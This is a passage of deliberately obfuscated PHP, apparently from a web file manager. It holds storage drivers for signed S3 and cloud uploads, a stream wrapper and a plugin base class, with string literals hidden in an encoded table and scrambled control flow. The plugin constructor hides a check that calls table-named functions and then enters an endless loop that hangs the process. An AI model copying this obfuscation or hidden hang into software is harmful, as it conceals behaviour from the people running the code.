fwrite($§Îû–¥º, $Àã£ñ š); $’İë–› += $¤ëıĞÌÚ; if (strlen($Àã£ñ š) < $¤ëıĞÌÚ) { break; } } fclose($§Îû–¥º); return $®İ£†Ù; } public function link($ÊõÑğİ, $‰ñËÔëÃ = '') { if (!$this->isFile($ÊõÑğİ)) { return !1; } $úê•ú´å = $this->getHost() . $_SERVER[ßğøİ][8] . $this->pathEncode($ÊõÑğİ) . $‰ñËÔëÃ; return $this->auth->privateDownloadUrl($úê•ú´å, 3600 * 12); } public function fileOut($Å¬”ÆÏñ, $¡ÄÉÑª» = false, $£üÆŒøí = false, $¥á–ıÊ = '') { $„™Î®‚­ =& $_SERVER[ßğøİ]; if ($this->isFileOutServer()) { return $this->fileOutServer($Å¬”ÆÏñ, $¡ÄÉÑª», $£üÆŒøí, $¥á–ıÊ); } if (!$£üÆŒøí) { $£üÆŒøí = $this->pathThis($Å¬”ÆÏñ); } $„ŞÍÈÌ = $¡ÄÉÑª» ? $„™Î®‚­[1439] . rawurlencode($£üÆŒøí) : $„™Î®‚­[12]; $åšÚÏ·  = $this->link($Å¬”ÆÏñ, $„ŞÍÈÌ); $this->fileOutLink($åšÚÏ· ); } public function fileOutServer($ç‰ÖıÅ, $Ú¾ÑîÍ = false, $“ÚâÑŞ‚ = false, $ÕÓÜÈªı = '') { parent::fileOut($ç‰ÖıÅ, $Ú¾ÑîÍ, $“ÚâÑŞ‚, $ÕÓÜÈªı); } public function fileOutImage($‚‚Ûá§Ù, $ çˆÏ±² = 250) { $Ÿ‘±ĞŸÊ = $this->link($‚‚Ûá§Ù, $_SERVER[ßğøİ][1440] . $ çˆÏ±²); $this->fileOutLink($Ÿ‘±ĞŸÊ); } public function fileOutImageServer($„ â™½ù, $¹ÅıÉ… = 250) { parent::fileOutImage($„ â™½ù, $¹ÅıÉ…); } public function hashMd5($Ô—°µÅ¸) { $éËš£ºÁ =& $_SERVER[ßğøİ]; $ƒşõŸÀ¤ = $this->objectMeta($Ô—°µÅ¸); return isset($ƒşõŸÀ¤[$éËš£ºÁ[212]]) ? $ƒşõŸÀ¤[$éËš£ºÁ[212]] : !1; $«Ù‹ıÉ‰ = $this->link($Ô—°µÅ¸, $éËš£ºÁ[1441]); } public function size($ÓŒ©´´±) { $Ô¥î¾Å‡ = $this->objectMeta($ÓŒ©´´±); return $Ô¥î¾Å‡ ? $Ô¥î¾Å‡[$_SERVER[ßğøİ][76]] : 0; } public function info($’ “ÔÄÈ) { if ($this->isFolder($’ “ÔÄÈ)) { return $this->folderInfo($’ “ÔÄÈ); } else { if ($this->isFile($’ “ÔÄÈ)) { return $this->fileInfo($’ “ÔÄÈ); } } return !1; } public function exist($ˆ–„·‡ı) { return $this->isFile($ˆ–„·‡ı) || $this->isFolder($ˆ–„·‡ı); } public function isFile($ŸëŒ—ª) { return !$this->isFolder($ŸëŒ—ª) && $this->objectMeta($ŸëŒ—ª); } public function isFolder($ÆòÀâÅ‡) { return $this->cacheMethod($_SERVER[ßğøİ][165], $ÆòÀâÅ‡); } protected function objectMeta($û¬ÁÓí¼) { return $this->cacheMethod($_SERVER[ßğøİ][167], $û¬ÁÓí¼); } protected function _objectMeta($…éåè®“) { $œõ…·§ =& $_SERVER[ßğøİ]; list($¤¹Í—ˆ, $øêºä¼¼) = $this->bucketManager->stat($this->bucket, $…éåè®“); if ($¤¹Í—ˆ) { $¤¹Í—ˆ[$œõ…·§[76]] = intval($¤¹Í—ˆ[$œõ…·§[1427]]); } return $¤¹Í—ˆ; } protected function _isFolder($®»¡µØä) { $Øé†ù›Ï =& $_SERVER[ßğøİ]; if ($®»¡µØä == $Øé†ù›Ï[12] || $®»¡µØä == $Øé†ù›Ï[8]) { return !0; } list($ãÈê®òà, $Ş®·«£¼) = $this->bucketManager->listFiles($this->bucket, trim($®»¡µØä, $Øé†ù›Ï[8]) . $Øé†ù›Ï[8], $Øé†ù›Ï[12], 1, $Øé†ù›Ï[8]); return !empty($ãÈê®òà[$Øé†ù›Ï[1430]]) || !empty($ãÈê®òà[$Øé†ù›Ï[1431]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($ßÊá) { parent::__construct($ßÊá); } public function uploadFormData($œí°Ä¡, $„ı­Î‚¢ = 3600) { $ÁÊŠò¶ =& $_SERVER[ßğøİ]; $’¾ÜüÁ™ = $ÁÊŠò¶[198]; $¸½¯‘íá = $ÁÊŠò¶[1346]; $¢“ïÏ¿º = $ÁÊŠò¶[62]; $ÈüûÌ˜ğ = gmdate($ÁÊŠò¶[1347]); $ÜÎ÷§ = gmdate($ÁÊŠò¶[748]); $¹Ùù±›ó = $ÁÊŠò¶[1348]; $§¼òüû› = $„ı­Î‚¢ . $ÁÊŠò¶[12]; $ÒøÒëÈ¨ = $ÁÊŠò¶[1310]; $‘Ìê œ« = array($this->accessKey, $ÜÎ÷§, $this->region, $¢“ïÏ¿º, $¹Ùù±›ó); $ÙôÏ‡Ò = implode($ÁÊŠò¶[8], $‘Ìê œ«); $€´òØâ« = array($ÁÊŠò¶[1312] => gmdate($ÁÊŠò¶[1311], strtotime($ÁÊŠò¶[1349])), $ÁÊŠò¶[1313] => array(array($ÁÊŠò¶[1315] => $this->bucket), array($ÁÊŠò¶[1314] => $’¾ÜüÁ™), array($ÁÊŠò¶[1316], $ÁÊŠò¶[1317], $ÁÊŠò¶[12]), array($ÁÊŠò¶[1316], $ÁÊŠò¶[1350], $ÁÊŠò¶[12]), array($ÁÊŠò¶[1316], $ÁÊŠò¶[1351], $ÁÊŠò¶[12]), array($ÁÊŠò¶[1318] => $ÒøÒëÈ¨), array($ÁÊŠò¶[1352] => $ÙôÏ‡Ò), array($ÁÊŠò¶[1353] => $¸½¯‘íá), array($ÁÊŠò¶[1354] => $ÈüûÌ˜ğ), array($ÁÊŠò¶[1355] => $§¼òüû›))); $óæÊƒÙŒ = base64_encode(json_encode($€´òØâ«)); $÷“èš†â = hash_hmac($ÁÊŠò¶[1356], $ÜÎ÷§, $ÁÊŠò¶[1357] . $this->secret, !0); $›ÂŞ€Ã” = hash_hmac($ÁÊŠò¶[1356], $this->region, $÷“èš†â, !0); $’„¥Ì€° = hash_hmac($ÁÊŠò¶[1356], $¢“ïÏ¿º, $›ÂŞ€Ã”, !0); $ÖéªÊöÙ = hash_hmac($ÁÊŠò¶[1356], $¹Ùù±›ó, $’„¥Ì€°, !0); $£ÉùÑ¦ã = hash_hmac($ÁÊŠò¶[1356], $óæÊƒÙŒ, $ÖéªÊöÙ); $âŞßÈ—é = array($ÁÊŠò¶[215] => $ÁÊŠò¶[12], $ÁÊŠò¶[1358] => $ÁÊŠò¶[12], $ÁÊŠò¶[1314] => $’¾ÜüÁ™, $ÁÊŠò¶[1318] => $ÒøÒëÈ¨, $ÁÊŠò¶[1322] => $óæÊƒÙŒ, $ÁÊŠò¶[1359] => $ÙôÏ‡Ò, $ÁÊŠò¶[1360] => $¸½¯‘íá, $ÁÊŠò¶[1361] => $ÈüûÌ˜ğ, $ÁÊŠò¶[1362] => $§¼òüû›, $ÁÊŠò¶[1363] => $£ÉùÑ¦ã, $ÁÊŠò¶[181] => $this->getHost()); return $âŞßÈ—é; } public function multiUploadFormData($ÕÏ«ôû, $¡İ±“á = 3600) { $§éçüÄÈ =& $_SERVER[ßğøİ]; $—ùœ¡Ü = gmdate($§éçüÄÈ[1442]); $˜‹ƒïÊ– = array(); $±î«¤› = $this->client->getUploadId($this->bucket, $ÕÏ«ôû, $˜‹ƒïÊ–); if (!$±î«¤›) { return !1; } return array($§éçüÄÈ[223] => $±î«¤›, $§éçüÄÈ[181] => $this->getHost() . $§éçüÄÈ[8] . $this->pathEncode($ÕÏ«ôû), $§éçüÄÈ[224] => $—ùœ¡Ü, $§éçüÄÈ[94] => $ÕÏ«ôû); } public function multiUploadAuthData($ĞŸ­…•ß, $ŒïÀ…Ş = array()) { $¥©õÛ‰ =& $_SERVER[ßğøİ]; $™¯¿íÛÆ = isset($ŒïÀ…Ş[$¥©õÛ‰[174]]) ? $ŒïÀ…Ş[$¥©õÛ‰[174]] : $¥©õÛ‰[12]; $Ñ÷ŸÈÏ² = $ŒïÀ…Ş[$¥©õÛ‰[94]]; unset($ŒïÀ…Ş[$¥©õÛ‰[94]]); if (isset($ŒïÀ…Ş[$¥©õÛ‰[225]])) { return $this->listUploadParts($Ñ÷ŸÈÏ², $ŒïÀ…Ş); } $ìú³ôäŸ = array(); if (isset($ŒïÀ…Ş[$¥©õÛ‰[1443]])) { $ìú³ôäŸ[$¥©õÛ‰[1444]] = $ŒïÀ…Ş[$¥©õÛ‰[1443]]; } $ºÒ¢¢¡ş = explode($¥©õÛ‰[183], $this->getHost()); $…•ÃâÃœ = array($¥©õÛ‰[1445] => $ºÒ¢¢¡ş[1], $¥©õÛ‰[1446] => $¥©õÛ‰[12], $¥©õÛ‰[215] => $¥©õÛ‰[120], $¥©õÛ‰[1358] => $ŒïÀ…Ş[$¥©õÛ‰[76]]); $¦®¸ì¹ş = $¥©õÛ‰[228]; $·Ûıî¼è = $¥©õÛ‰[8] . $this->pathEncode($Ñ÷ŸÈÏ²) . $™¯¿íÛÆ; $øïŞ¢´¤ = $this->client->__getSignatureV4($ìú³ôäŸ, $…•ÃâÃœ, $¦®¸ì¹ş, $·Ûıî¼è); if (strpos($™¯¿íÛÆ, $¥©õÛ‰[227]) === 0) { if (isset($ìú³ôäŸ[$¥©õÛ‰[1444]])) { $£âüÀ«Ï = $ìú³ôäŸ[$¥©õÛ‰[1444]]; } else { if (isset($øïŞ¢´¤[$¥©õÛ‰[1444]])) { $£âüÀ«Ï = $øïŞ¢´¤[$¥©õÛ‰[1444]]; } else { $£âüÀ«Ï = hash($¥©õÛ‰[1356], $¥©õÛ‰[12]); } } return array($¥©õÛ‰[234] => $øïŞ¢´¤[$¥©õÛ‰[234]], $¥©õÛ‰[1444] => $£âüÀ«Ï, $¥©õÛ‰[224] => $øïŞ¢´¤[$¥©õÛ‰[1447]]); } return $øïŞ¢´¤[$¥©õÛ‰[234]]; } public function listUploadParts($®êËïæ¬, $â·ô½îª = array()) { $ÄùÓöÀ  =& $_SERVER[ßğøİ]; $óÎ·Â•õ = str_replace($ÄùÓöÀ [235], $ÄùÓöÀ [12], $â·ô½îª[$ÄùÓöÀ [174]]); $ÉØ“†ß‰ = $this->client->listParts($this->bucket, $®êËïæ¬, $óÎ·Â•õ); if (!$ÉØ“†ß‰) { return !1; } $‚Ú÷Œöµ = $ÄùÓöÀ [1448]; foreach ($ÉØ“†ß‰ as $ºÂ–²£‹) { $‚Ú÷Œöµ .= $ÄùÓöÀ [1449] . "\x3c\x50\x61\162\164\116\x75\x6d\142\x65\162\76{$ºÂ–²£‹[$ÄùÓöÀ [1403]]}\x3c\x2f\x50\x61\x72\x74\116\x75\x6d\x62\145\162\x3e\12" . "\74\x45\x54\x61\x67\76{$ºÂ–²£‹[$ÄùÓöÀ [1404]]}\74\57\105\124\x61\147\76\12" . $ÄùÓöÀ [1450]; } $‚Ú÷Œöµ .= $ÄùÓöÀ [1451]; $Æ«Ìå = array(); $â¶§àƒœ = explode($ÄùÓöÀ [183], $this->getHost()); $ó„Øò¿¿ = array($ÄùÓöÀ [1445] => $â¶§àƒœ[1], $ÄùÓöÀ [215] => $ÄùÓöÀ [120], $ÄùÓöÀ [1358] => strlen($‚Ú÷Œöµ)); $˜æÕİ¢ß = $ÄùÓöÀ [226]; $øœ´ŠºÎ = $ÄùÓöÀ [8] . $this->pathEncode($®êËïæ¬) . $â·ô½îª[$ÄùÓöÀ [174]]; $òäş˜åÌ = $this->client->__getSignatureV4($Æ«Ìå, $ó„Øò¿¿, $˜æÕİ¢ß, $øœ´ŠºÎ, $‚Ú÷Œöµ); return array($ÄùÓöÀ [234] => $òäş˜åÌ[$ÄùÓöÀ [234]], $ÄùÓöÀ [224] => $òäş˜åÌ[$ÄùÓöÀ [1447]], $ÄùÓöÀ [236] => $ÉØ“†ß‰, $ÄùÓöÀ [1444] => $òäş˜åÌ[$ÄùÓöÀ [1444]]); } public function link($¯›Ñï¬¼, $ãÛÆíÙµ = array()) { return parent::link($¯›Ñï¬¼, $ãÛÆíÙµ); } public function fileOut($üªÎœã, $¹èŒ’ŸÁ = false, $äğÓ°šõ = false, $â¦÷éæ¸ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[ßğøİ][1452])) { return parent::fileOutServer($üªÎœã, $¹èŒ’ŸÁ, $äğÓ°šõ, $â¦÷éæ¸); } parent::fileOut($üªÎœã, $¹èŒ’ŸÁ, $äğÓ°šõ, $â¦÷éæ¸); } public function fileOutImage($¨½°å, $ãö²Û  = 250) { if (strstr($this->endpoint, $_SERVER[ßğøİ][1452])) { return parent::fileOutImageServer($¨½°å, $ãö²Û ); } parent::fileOutImage($¨½°å, $ãö²Û ); } public function fileOutLink($¸ËçÔ·×) { $–›¾¶Âˆ =& $_SERVER[ßğøİ]; if (substr($¸ËçÔ·×, 0, 7) == $–›¾¶Âˆ[1325]) { $¸ËçÔ·× = $–›¾¶Âˆ[1326] . substr($¸ËçÔ·×, 7); } header($–›¾¶Âˆ[161] . $¸ËçÔ·×); die; } public function getHost() { $‡¹©Ö´® =& $_SERVER[ßğøİ]; $ˆ‡¦’¹ƒ = str_rtrim(parent::getHost(), $‡¹©Ö´®[8] . $this->bucket); $ˆ‡¦’¹ƒ = explode($‡¹©Ö´®[183], $ˆ‡¦’¹ƒ); return $ˆ‡¦’¹ƒ[0] . $‡¹©Ö´®[183] . $this->bucket . $‡¹©Ö´®[10] . $ˆ‡¦’¹ƒ[1]; } } goto e£¬¿œê; cŠìÈÊ£†Ç: define($_SERVER[ßğøİ][0], $_SERVER[ßğøİ][1]); $_SERVER[äÓ¯ÍÙ] = explode($_SERVER[ßğøİ][2], gzinflate(substr($_SERVER[ßğøİ][3], 10, -8))); function binCheckEq($æ¥¦®£º, $Ï••òÎ) { return $æ¥¦®£º == $Ï••òÎ; } goto Eî­Í¬ïˆÌ; CˆÀ“§Œ: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($À†Ïá‘ß, $×­ÜÄ¶Ü = '') { $this->info = $this->info($À†Ïá‘ß); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ßğøİ][84]]; $this->pathOpen = $À†Ïá‘ß; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$À†Ïá‘ß])) { self::$_chunkBuffer[$À†Ïá‘ß] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($ûÙªÁÎë) { $ ıŠ†ßá = $this->fileSubstr($this->pose, $ûÙªÁÎë); $this->pose += strlen($ ıŠ†ßá); return $ ıŠ†ßá; } public function stream_tell() { return $this->pose; } public function stream_seek($¨¥àæ—, $Ø³¶âÂ×) { $¶Îï¯Ç =& $_SERVER[ßğøİ]; if ($Ø³¶âÂ× == SEEK_SET) { $this->pose = $¨¥àæ—; } else { if ($Ø³¶âÂ× == SEEK_CUR) { $this->pose += $¨¥àæ—; } else { if ($Ø³¶âÂ× == SEEK_END) { $this->pose = $this->info[$¶Îï¯Ç[76]] + intval($¨¥àæ—); } } } if ($¨¥àæ— < 0) { $this->pose = $this->info[$¶Îï¯Ç[76]] + $¨¥àæ—; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ßğøİ][76]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($“Ùí²Ê«, $”¸æ“ÇÅ) { $êéÍÒéŠ =& $_SERVER[ßğøİ]; $Ë¿²ÛÉ = $this->info($“Ùí²Ê«); return array($êéÍÒéŠ[1503] => 0, $êéÍÒéŠ[1504] => 0, $êéÍÒéŠ[16] => 32768 + 511, $êéÍÒéŠ[1505] => 0, $êéÍÒéŠ[1506] => 0, $êéÍÒéŠ[1507] => 0, $êéÍÒéŠ[1508] => 0, $êéÍÒéŠ[76] => $Ë¿²ÛÉ[$êéÍÒéŠ[76]], $êéÍÒéŠ[1509] => $Ë¿²ÛÉ[$êéÍÒéŠ[1377]], $êéÍÒéŠ[1465] => $Ë¿²ÛÉ[$êéÍÒéŠ[85]], $êéÍÒéŠ[1464] => $Ë¿²ÛÉ[$êéÍÒéŠ[200]], $êéÍÒéŠ[1510] => 0, $êéÍÒéŠ[1511] => 0); } static $fileInfo = array(); public function info($³Ö¤ğ‹) { $à½¼šˆ¹ = $_SERVER[ßğøİ][1512]; if (isset(self::$fileInfo[$³Ö¤ğ‹])) { return self::$fileInfo[$³Ö¤ğ‹]; } if (substr($³Ö¤ğ‹, 0, strlen($à½¼šˆ¹)) != $à½¼šˆ¹) { return !1; } self::$fileInfo[$³Ö¤ğ‹] = IO::info(substr($³Ö¤ğ‹, strlen($à½¼šˆ¹))); return self::$fileInfo[$³Ö¤ğ‹]; } public static function read($ø„İÀßì, $Š¢ÇÙÏ°, $Ò¼ªñÚş) { if (!isset(self::$_fopenCache[$ø„İÀßì])) { $ÉÃµÍ™° = new StreamWrapperIO(); $ÉÃµÍ™°->stream_open($ø„İÀßì); self::$_fopenCache[$ø„İÀßì] = $ÉÃµÍ™°; } $ÉÃµÍ™° = self::$_fopenCache[$ø„İÀßì]; return $ÉÃµÍ™°->fileSubstr($Š¢ÇÙÏ°, $Ò¼ªñÚş); } public static function _read($ôÑËéÄ¦, $‚î¡·–‰, $Ï¾öÒá’) { $¯Ç“Ä® =& $_SERVER[ßğøİ]; $§µƒ®  = fopen($ôÑËéÄ¦, $¯Ç“Ä®[1381]); if (!$§µƒ® ) { return $¯Ç“Ä®[12]; } $„™‡òÙ¦ = 8192; fseek($§µƒ® , $‚î¡·–‰, SEEK_SET); $à­ÃğÒ– = $¯Ç“Ä®[12]; $›€òã² = 0; while ($›€òã² < $Ï¾öÒá’) { $®—ğœà… = min($„™‡òÙ¦, $Ï¾öÒá’ - $›€òã²); $à­ÃğÒ– .= fread($§µƒ® , $®—ğœà…); $›€òã² += $®—ğœà…; } fclose($§µƒ® ); return $à­ÃğÒ–; } public function fileSubstr($É¸Š¥ó, $ÎÙÏÙ¬³) { $ÅñŸØæ§ =& $_SERVER[ßğøİ]; $»¹Ò´¬Ù = $this->info[$ÅñŸØæ§[76]]; $™ãŠµ = $É¸Š¥ó; $áò½ğÚ = $ÎÙÏÙ¬³; if ($É¸Š¥ó < 0) { $É¸Š¥ó = $»¹Ò´¬Ù + $É¸Š¥ó; } if ($ÎÙÏÙ¬³ === !1) { $ÎÙÏÙ¬³ = $»¹Ò´¬Ù - $É¸Š¥ó; } if ($É¸Š¥ó + $ÎÙÏÙ¬³ > $»¹Ò´¬Ù) { $ÎÙÏÙ¬³ = $»¹Ò´¬Ù - $É¸Š¥ó; } if ($ÎÙÏÙ¬³ <= 0) { return $ÅñŸØæ§[12]; } if ($É¸Š¥ó < 0 || $É¸Š¥ó >= $»¹Ò´¬Ù || $ÎÙÏÙ¬³ <= 0 || $ÎÙÏÙ¬³ > 1024 * 1024 * 10) { throw new Exception("\x69\157\x46\x69\154\x65\122\145\x61\144\x20\x65\162\x72\157\162\41\x20\163\x74\141\162\164\75{$É¸Š¥ó}\x3b\x6c\145\156\x67\x74\150\x3d{$ÎÙÏÙ¬³}\73\x20\163\151\x7a\145\x3d{$»¹Ò´¬Ù}\73"); } $¤Ã‹¤ÁÜ = 64 * 1024; $†ğç´‡ =& self::$_chunkBuffer[$this->path]; if (!$†ğç´‡) { $†ğç´‡ = array(); } $¸®¹Êìƒ = 0; $ŸßÄøÁ = 0; $è÷»æ¼â = $ÅñŸØæ§[12]; foreach ($†ğç´‡ as $¸®¹Êìƒ => $è÷»æ¼â) { $¸®¹Êìƒ = intval($¸®¹Êìƒ); $ŸßÄøÁ = $¸®¹Êìƒ + strlen($è÷»æ¼â); if ($É¸Š¥ó >= $ŸßÄøÁ) { continue; } if ($É¸Š¥ó >= $¸®¹Êìƒ && $É¸Š¥ó + $ÎÙÏÙ¬³ <= $ŸßÄøÁ) { return substr($è÷»æ¼â, $É¸Š¥ó - $¸®¹Êìƒ, $ÎÙÏÙ¬³); } break; } if (count($†ğç´‡) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($ÅñŸØæ§[1513], $ÅñŸØæ§[1514] . count($†ğç´‡) . "\73\163\x74\x61\x72\164\75{$É¸Š¥ó}\x2c\x6c\x65\x6e\147\164\150\75{$ÎÙÏÙ¬³}\73\x70\x6f\x73\145\72{$¸®¹Êìƒ}\x7e{$ŸßÄøÁ}"); throw new Exception($ÅñŸØæ§[1515]); } $¥ÅõÑ¯ = intval($É¸Š¥ó / $¤Ã‹¤ÁÜ) * $¤Ã‹¤ÁÜ; $ äË‰Ú€ = ceil(($É¸Š¥ó + $ÎÙÏÙ¬³) / $¤Ã‹¤ÁÜ) * $¤Ã‹¤ÁÜ - $¥ÅõÑ¯; $Ï§™¯Ü´ = IO::fileSubstr($this->path, $¥ÅõÑ¯, $ äË‰Ú€); $†ğç´‡[$¥ÅõÑ¯ . $ÅñŸØæ§[12]] = $Ï§™¯Ü´; ksort($†ğç´‡); $‹š†¼ÅØ = substr($Ï§™¯Ü´, $É¸Š¥ó - $¥ÅõÑ¯, $ÎÙÏÙ¬³); return $‹š†¼ÅØ; } private function log($¥‡„ÄÎ, $‡½ÏæÁ) { $ù­ş‚Å² =& $_SERVER[ßğøİ]; $ŸÙŸşô˜ = timeFloat() - $this->timeStart; write_log(sprintf($ù­ş‚Å²[1516], $¥‡„ÄÎ, $this->info[$ù­ş‚Å²[32]], $ŸÙŸşô˜, $‡½ÏæÁ), $ù­ş‚Å²[1183]); } } class Message { function __construct() { } public function send($àá©íşí = '', $ã–¹ÕÄ† = array(), $§»áÀßš = "\x74\145\170\164") { $Ë¤¨¯š£ =& $_SERVER[ßğøİ]; $Ñ…©²› = array($Ë¤¨¯š£[33] => $Ë¤¨¯š£[1517], $Ë¤¨¯š£[752] => $àá©íşí); if (in_array($§»áÀßš, array($Ë¤¨¯š£[1517], $Ë¤¨¯š£[1518]))) { $Ñ…©²›[$Ë¤¨¯š£[33]] = $§»áÀßš; } $ã–¹ÕÄ† = array($Ë¤¨¯š£[515] => isset($ã–¹ÕÄ†[$Ë¤¨¯š£[515]]) ? $ã–¹ÕÄ†[$Ë¤¨¯š£[515]] : $Ë¤¨¯š£[12], $Ë¤¨¯š£[600] => isset($ã–¹ÕÄ†[$Ë¤¨¯š£[600]]) ? $ã–¹ÕÄ†[$Ë¤¨¯š£[600]] : $Ë¤¨¯š£[12]); if (empty($àá©íşí) || empty($ã–¹ÕÄ†[$Ë¤¨¯š£[515]]) && empty($ã–¹ÕÄ†[$Ë¤¨¯š£[600]])) { return !1; } $òûÃ³øó = array($Ë¤¨¯š£[1458] => $Ñ…©²›, $Ë¤¨¯š£[1519] => $ã–¹ÕÄ†); Hook::trigger($Ë¤¨¯š£[1520], $òûÃ³øó); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $«õöòÖ½ =& $_SERVER[ßğøİ]; if (!isset($_SERVER[$«õöòÖ½[871]]) || !isset($_SERVER[$«õöòÖ½[869]])) { $’·è›Æ› = $«õöòÖ½[872]; $»ì‡±é• = $«õöòÖ½[873]; $üØÁ¶îô = $_SERVER[$«õöòÖ½[874]] . $«õöòÖ½[875]; $ š„áæô = $»ì‡±é•($üØÁ¶îô); $ô×¥á³­ = explode($«õöòÖ½[231], $ š„áæô); if (count($ô×¥á³­) < $«õöòÖ½[620]) { $½ºô’ç = $«õöòÖ½[876]; $½ºô’ç(); } $ ‹Íë¡Æ = $«õöòÖ½[877]; $ ‹Íë¡Æ($_SERVER[$«õöòÖ½[878]]); $ôØòñÅ’ = 1; for ($É›¿»Õ = $ôØòñÅ’; $É›¿»Õ > 0; $É›¿»Õ++) { $ ‹Íë¡Æ = json_encode($GLOBALS[$«õöòÖ½[418]]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($«õöòÖ½[1521]); $this->pluginName = str_replace($«õöòÖ½[1521], $«õöòÖ½[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $«õöòÖ½[8]; $this->pluginApi = appHostGet() . $«õöòÖ½[1522] . $this->pluginName . $«õöòÖ½[8]; $this->pluginHost = $config[$«õöòÖ½[1523]] . $this->pluginName . $«õöòÖ½[8]; $this->pluginHostDefault = $config[$«õöòÖ½[1523]] . $this->pluginName . $«õöòÖ½[8]; $Í ‹Î•‹ = $config[$«õöòÖ½[1524]]; if ($Í ‹Î•‹ && strpos($«õöòÖ½[50] . $Í ‹Î•‹ . $«õöòÖ½[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$«õöòÖ½[1525]] . $this->pluginName . $«õöòÖ½[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ßğøİ][1526]); } protected function assign($¹‘‹‹ùš, $Ñë•ıãß = false) { if (is_array($¹‘‹‹ùš)) { $this->values = array_merge($this->values, $¹‘‹‹ùš); } else { $this->values[$¹‘‹‹ùš] = $Ñë•ıãß; } } protected function display($›ú¶™Íû) { extract($this->values); require $›ú¶™Íû; } final function hookRegist($ñ¹”œŞÚ) { $this->modelPlugin->appRegist($this->pluginName, $ñ¹”œŞÚ); } final function appIcon() { $ËÅÆÎä =& $_SERVER[ßğøİ]; $²ÎÜĞ‰³ = $this->appPackage(); $æ¹Ø“ÔÖ = $ËÅÆÎä[12]; if (isset($²ÎÜĞ‰³[$ËÅÆÎä[416]])) { if (isset($²ÎÜĞ‰³[$ËÅÆÎä[416]][$ËÅÆÎä[1527]])) { $æ¹Ø“ÔÖ = $ËÅÆÎä[1528] . $²ÎÜĞ‰³[$ËÅÆÎä[416]][$ËÅÆÎä[1527]] . $ËÅÆÎä[1529]; } else { if ($²ÎÜĞ‰³[$ËÅÆÎä[416]][$ËÅÆÎä[1530]]) { $æ¹Ø“ÔÖ = $ËÅÆÎä[1531] . $²ÎÜĞ‰³[$ËÅÆÎä[416]][$ËÅÆÎä[1530]] . $ËÅÆÎä[1532]; } } } return $æ¹Ø“ÔÖ; } final function fileCanView($µÕûìÛ) { $ÆëÀ»ÓÀ =& $_SERVER[ßğøİ]; if (request_url_safe($µÕûìÛ)) { return !0; } if ($this->isShare($µÕûìÛ)) { return !0; } $Èµí£€÷ = Session::get($ÆëÀ»ÓÀ[1533]); if (!$Èµí£€÷ || !$Èµí£€÷[$ÆëÀ»ÓÀ[1534]]) { $»óÎÈù› = $ÆëÀ»ÓÀ[1535] . rawurlencode(this_url()); show_tips(LNG($ÆëÀ»ÓÀ[1536]) . $ÆëÀ»ÓÀ[1537] . $»óÎÈù› . $ÆëÀ»ÓÀ[1538] . LNG($ÆëÀ»ÓÀ[1539]) . $ÆëÀ»ÓÀ[1540], !1); } if (!Action($ÆëÀ»ÓÀ[1541])->authCan($ÆëÀ»ÓÀ[1542])) { show_tips(LNG($ÆëÀ»ÓÀ[1543]) . $ÆëÀ»ÓÀ[1544], !1); } ActionCall($ÆëÀ»ÓÀ[1545], $µÕûìÛ); } final function isShare($Ë´¸ïï) { $±Ô˜Ì“« = KodIO::parse($Ë´¸ïï); return $±Ô˜Ì“«[$_SERVER[ßğøİ][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($¡³âÆÈÂ) { if (request_url_safe($¡³âÆÈÂ)) { return $¡³âÆÈÂ; } if (!$this->isShare($¡³âÆÈÂ)) { $¡³âÆÈÂ = $this->filePath($¡³âÆÈÂ); } return Action($_SERVER[ßğøİ][1175])->linkOut($¡³âÆÈÂ); } public function filePathLinkOut($¡®Ï¶´) { if (request_url_safe($¡®Ï¶´)) { return $¡®Ï¶´; } $this->fileCanView($¡®Ï¶´); return Action($_SERVER[ßğøİ][1175])->link($¡®Ï¶´); } final function filePath($×¸æ±şò) { $Ë¼•Ç =& $_SERVER[ßğøİ]; if ($¦‚Æ›Œ = $this->checkSharePath($×¸æ±şò)) { Hook::trigger($Ë¼•Ç[1546], $¦‚Æ›Œ); return $¦‚Æ›Œ; } $this->fileCanView($×¸æ±şò); if (request_url_safe($×¸æ±şò)) { $ÃÁç‰Ì‚ = parse_url_query($×¸æ±şò); if (isset($ÃÁç‰Ì‚[$Ë¼•Ç[1547]]) && isset($ÃÁç‰Ì‚[$Ë¼•Ç[213]])) { $åû“ïŠÀ = Model($Ë¼•Ç[767])->get($Ë¼•Ç[768]); $‘ÓôÒ¤ = Mcrypt::decode($ÃÁç‰Ì‚[$Ë¼•Ç[213]], $åû“ïŠÀ); if ($‘ÓôÒ¤) { $this->fileInfo = IO::infoWithChildren($‘ÓôÒ¤); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $‘ÓôÒ¤; } } $×¸æ±şò = $this->_cacheHttpFile($×¸æ±şò); $this->fileInfo = IO::infoWithChildren($×¸æ±şò); } else { $this->fileInfo = IO::infoWithChildren($×¸æ±şò); if (!$this->fileInfo) { show_tips(LNG($Ë¼•Ç[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($Ë¼•Ç[1546], $×¸æ±şò); return $×¸æ±şò; } final function _cacheHttpFile($®Â‚šÄâ) { $Ç¡–‡ŸÍ = hash_path($®Â‚šÄâ, !0); $this->cachePath = $this->pluginCachePath($Ç¡–‡ŸÍ); if 